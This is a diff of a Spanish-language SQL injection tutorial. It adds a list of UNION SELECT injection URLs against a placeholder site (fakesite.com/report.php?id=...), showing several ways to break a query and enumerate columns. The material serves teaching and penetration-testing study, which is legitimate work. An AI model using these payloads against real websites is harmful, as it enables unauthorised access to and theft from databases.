@@ -131,6 +131,18 @@ Lo primero que realizaremos, será obtener algún tipo de error, para ello inten
 
 *A tener en cuenta, que a veces cuando sobre-excedemos con el order by, cierto contenido de la web, puede desaparecer*
 
+``
+http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5;-- -
+http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5;-- -
+http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5;-- -
+http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5;-- -
+http://fakesite.com/report.php?id=null union select 1,2,3,4,5;-- -
+http://fakesite.com/report.php?id=23 && 0 union select 1,2,3,4,5;-- -
+
+# Otras formas de romper Query <-- URLEncondear.
+``
+
+
 `http://fakesite.com/report.php?id=23' union select 1,2,3,4,5;-- -` # Suponiendo que tenga 5 tablas, enumeramos.
 
 *Podemos sustituir los números por lo que queramos, la cosa es tener visible que nos reporta la inyección de la query*
